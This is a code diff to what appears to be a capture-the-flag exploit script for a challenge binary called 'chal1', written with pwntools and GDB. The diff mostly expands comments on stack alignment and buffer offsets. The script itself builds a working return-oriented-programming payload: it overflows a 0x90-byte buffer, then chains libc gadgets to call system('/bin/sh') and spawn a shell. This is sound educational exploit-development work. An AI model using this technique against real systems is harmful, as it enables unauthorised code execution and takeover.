@@ -30,7 +30,7 @@ with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
 
     print(conn.recvline())
     # We use the `grep "/bin/sh\\x00` command in GDB with GEF to search
-    # for an address in libc that has a "/bin/sh" string.
+    # for an address in libc that has a null-terminated "/bin/sh" string.
     binsh_addr = libc_base_addr + 1934968
     # The set rdi ROP gadget is found using the ROPgadget tool.
     # `ROPgadget --binary libc.so.6 --ropchain --nojop`
@@ -40,18 +40,22 @@ with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
     system_addr = libc_base_addr + 331120
     # A simple ret gadget that just has one ret instruction is
     # necessary for 16-byte alignment of the stack when calling system.
-    # In x86-64, rsp needs to be a multiple of 16 before a call
-    # instruction, so after a call, and when we jump to system, rsp
-    # should be offset by 8.
+    # In the Linux x86-64 ABI, rsp needs to be a multiple of 16 before
+    # a call instruction, so after a call, rsp should be offset by 8
+    # (rsp mod 16 = 8). Therefore, rsp needs to be offset by 8 when we
+    # jump to system.
     ret_gadget_addr = libc_base_addr + 0x29cd6
 
     # The ROP chain payload
-    payload = \
-        b"h" * 0x90 + b"h" * 8 + \
-        p64(set_rdi_gadget_addr) + \
-        p64(binsh_addr) + \
-        p64(ret_gadget_addr) + \
-        p64(system_addr)
+
+    # Buffer is at rbp-0x90, so fill 0x90 bytes
+    # Return address is at rbp+0x8 since location at rbp is the
+    # saved previous value of rbp, so fill another 8 bytes
+    payload = b"h" * 0x90 + b"h" * 8
+    payload += p64(set_rdi_gadget_addr)
+    payload += p64(binsh_addr)
+    payload += p64(ret_gadget_addr)
+    payload += p64(system_addr)
     conn.sendline(payload)
 
     print(conn.recvline())
